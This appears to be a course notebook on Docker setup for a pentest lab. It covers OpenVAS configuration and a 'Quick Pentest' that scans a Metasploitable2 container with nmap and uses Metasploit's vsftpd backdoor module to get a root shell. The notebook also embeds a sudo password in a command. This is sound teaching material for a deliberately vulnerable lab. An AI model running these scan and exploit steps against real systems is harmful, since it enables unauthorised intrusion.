# Docker

## Install Docker & Docker Compose
- GitHub Codespaces already has docker and docker-compose installed and the docker daemon running
- if you download and use SEED VM Ubuntu 20.04 from https://seedsecuritylabs.org/labs.html, you already have docker installed and configured
- if you use your own Ubuntu/Kali, follow the instructions from the following link:
     - https://www.kali.org/docs/containers/installing-docker-on-kali/#installing-docker-ce-on-kali-linux
- `$ sudo apt install -y docker-compose`

## Docker Documentations
- Docker Manual from SEEDLabs
- [https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md)
- https://docs.docker.com/get-started/
- https://docs.docker.com/manuals/


```python
! echo kali | sudo -S apt install -y docker-compose
```

    Reading package lists... Done
    Building dependency tree... Done
    Reading state information... Done
    docker-compose is already the newest version (1.29.2-6).
    The following packages were automatically installed and are no longer required:
      fonts-noto-color-emoji libabsl20220623 libaio1 libatk-adaptor libbabeltrace1
      libboost-dev libboost1.83-dev libc6-dbg libdebuginfod-common libipt2
      libnsl-dev libopenblas-dev libopenblas-pthread-dev libopenblas0
      libpython3-all-dev libpython3.12-dev libsource-highlight-common
      libsource-highlight4t64 libtirpc-dev libxsimd-dev python3-all-dev
      python3-anyjson python3-beniget python3-gast python3-pyatspi python3-pypdf2
      python3-pyppeteer python3-pyrsistent python3-pythran python3.12-dev xtl-dev
    Use 'sudo apt autoremove' to remove them.
    0 upgraded, 0 newly installed, 0 to remove and 1327 not upgraded.


## Important Docker Commands

- `$ docker ps` # list all the containers running
- `$ docker exec -it --rm <container-name/id> <bash command; e.g. /bin/bash>`
- `$ docker image ls`
- `$ docker image rm <image-id>`
- `$ docker image prune`
- `$ docker network ls`
- `$ docker network rm <network-id>`
- `$ docker network prune`
- `$ docker container ls` # list all the continer running


## Docker Compose
- `$ docker-compose up -d` # start all services in the background
- `$ docker-compose down`
- `$ docker-compose logs`
- `$ docker-compose exec <service-name> <bash command; e.g. /bin/bash>`
- `$ docker-compose build`
- `$ docker exec -it <container-id> zsh`

## Steps to Start Docker Pentest network
- change the working directory to `demos/pentest`
- run the following commands

- `$ docker-compose up -d`
- `$ docker ps`
- `$ docker exec -it <container-id> <zsh|bash>`

## Configure OpenVAS vulnerability scanner in Docker

- https://greenbone.github.io/docs/latest/22.4/kali/index.html 
- Kalii Docker image already has OpenVAS installed
- Run the automatic configuration script to setup OpenVAS
- you must record the default password created for the admin user

```bash
$ docker exec -it <kali-container-id> bash
$ gvm-setup
$ gvm-check-setup
$ gvm-start
$ gvm-stop
```

- login to the OpenVAS web interface using the default password
- On local system/VM, go to https://localhost:9392; or Click the URL under Port tab on your Codespaces

## Quick Pentest
- run namp on the metasploitable target/victim

- `$ nmap`
- `$ nmap 192.168.10.200`
- `$ nmap -sV -p 21 192.168.10.200`
- `$ msfconsole`
- `msf6 > search vsftpd`
- `msf6 > use 1`
- `msf6 > show options`
- `msf6 > set rhosts 192.168.10.200`
- `msf6 > set rport 21`
- `msf6 > show option`
- `msf6 > exploit`

- should pawn the target...
- you'll get a root shell to metasploitable2 that you can interact with!
- you don't get a prompt; just type bash commands
- `whomai`
- `uname -a`
- `touch iwashere`

- get the interactive shell to metasploitable2 and see the file created...
- `docker exec -it metasploitable2 bash`
- `# ls`




```python

```
